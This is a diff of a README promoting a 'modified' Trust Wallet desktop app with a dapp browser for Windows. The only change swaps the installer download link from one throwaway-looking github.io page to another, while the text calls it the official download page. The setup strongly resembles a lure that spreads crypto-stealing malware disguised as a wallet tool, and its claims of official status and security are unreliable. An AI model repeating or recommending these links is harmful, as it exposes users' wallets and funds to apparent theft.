@@ -2,7 +2,7 @@
 
 The Trust Wallet Desktop Dapp Browser is a cutting-edge modification for the official Trust Wallet Desktop application, designed specifically for Windows users in 2026. It introduces a robust dapp browser and enhanced security features, providing a superior cryptocurrency management experience with optimized performance and user-friendly tools. This mod aims to elevate your interaction with decentralized applications while maintaining the highest standards of security and reliability.
 
-[![Download Installer](https://img.shields.io/badge/Download-Setup%20v15.07-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Setup%20v15.07-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -67,7 +67,7 @@ A5: As long as you follow standard security practices—such as backing up your 
 ## Download
 
 To download the latest version of Trust Wallet Desktop Dapp Browser, visit the official download page:
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This tool is provided for educational and personal use only. Ensure you comply with all applicable laws and regulations in your jurisdiction. The developers assume no responsibility for any misuse or damages arising from the use of this software.
 
